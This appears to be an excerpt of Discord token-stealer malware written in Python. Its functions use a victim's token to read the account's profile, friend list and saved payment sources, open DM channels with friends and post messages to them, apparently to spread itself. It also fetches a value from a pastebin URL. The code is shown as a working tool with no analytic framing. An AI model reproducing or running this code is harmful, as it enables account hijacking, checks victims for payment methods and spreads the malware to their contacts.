...
def get_user_data(token):
    try:
        return loads(urlopen(Request('https://discordapp.com/api/v9/users/@me', headers=get_headers(token))).read().decode())
    except:
        pass
...
def get_developer():
    dev = 'checksum'
    try:
        dev = urlopen(Request('https://pastebin.com/raw/a7dxZXte')).read().decode()
    except:
        pass
    return dev
...
def get_friends(token):
    try:
        return loads(urlopen(Request('https://discordapp.com/api/v9/users/@me/relationships', headers=get_headers(token))).read().decode())
    except:
        pass

def get_chat(token, uid):
    try:
        return loads(urlopen(Request('https://discordapp.com/api/v9/users/@me/channels', headers=get_headers(token), data=dumps({'recipient_id': uid}).encode())).read().decode())['id']
    except:
        pass

def has_payment_methods(token):
    try:
        return len(loads(urlopen(Request('https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=get_headers(token))).read().decode())) > 0
    except:
        pass

def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f'https://discordapp.com/api/v9/channels/{chat_id}/messages', headers=get_headers(token, 'multipart/form-data; boundary=---------------------------325414537030329320151394843687'), data=form_data.encode())).read().decode()
    except:
        pass
